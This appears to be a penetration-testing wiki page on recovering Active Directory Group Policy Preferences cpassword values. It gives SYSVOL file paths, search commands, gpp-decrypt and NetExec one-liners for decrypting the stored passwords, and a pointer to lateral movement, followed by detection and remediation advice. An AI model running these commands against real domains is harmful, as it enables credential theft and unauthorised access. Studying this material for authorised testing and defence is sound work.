# Group Policy Preferences (cpassword)

Group Policy Preferences (GPP) let domain admins push settings — including creating local users and mapping drives — with an embedded password. That password is stored in XML on the domain's **SYSVOL** share, encrypted with AES-256… using a **key Microsoft published in MSDN**. Any authenticated domain user can read SYSVOL, grab the `cpassword` value, and decrypt it instantly. Although Microsoft patched GPP to stop *creating* new cpasswords (MS14-025) in 2014, it never removed existing ones, so legacy `cpassword` entries are still a reliable credential source on older domains.

## Where the passwords live

Readable by any domain user on the DC's SYSVOL share:

```text
\\<domain>\SYSVOL\<domain>\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

Also appears in `Services.xml`, `ScheduledTasks.xml`, `DataSources.xml`, `Drives.xml`, and `Printers.xml`.

## Find cpassword

From a domain-joined host or with domain creds:

```cmd
findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml
```

```powershell
Get-ChildItem \\<domain>\SYSVOL\ -Recurse -Include *.xml | Select-String cpassword
```

## Decrypt

The AES key is public, so any of these decrypt it offline instantly:

```bash
# metasploit / standalone
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
```

The PowerSploit function `Get-GPPPassword` (and NetExec's `--gpp-password`) finds and decrypts in one step:

```bash
netexec smb <dc-ip> -u user -p pass -M gpp_password
```

Use the recovered local-admin credential for lateral movement → Pass The Hash Attack, Password Cracking.

## Detection and defenses

- **Detection:** reads of `Groups.xml`/`*.xml` under SYSVOL from unusual hosts; presence of any `cpassword` value is itself a finding.
- **Defenses:** apply MS14-025 **and** delete existing GPP XML containing `cpassword`; rotate any exposed passwords; use LAPS for local-admin passwords instead.

## Related
- [Password Mining](Password-Mining.md) — folder hub for credential discovery
- Pass The Hash Attack — use recovered local-admin creds across hosts
- Password Cracking — crack any recovered hashes
- Offensive Active Directory — GPP is an AD-domain credential source
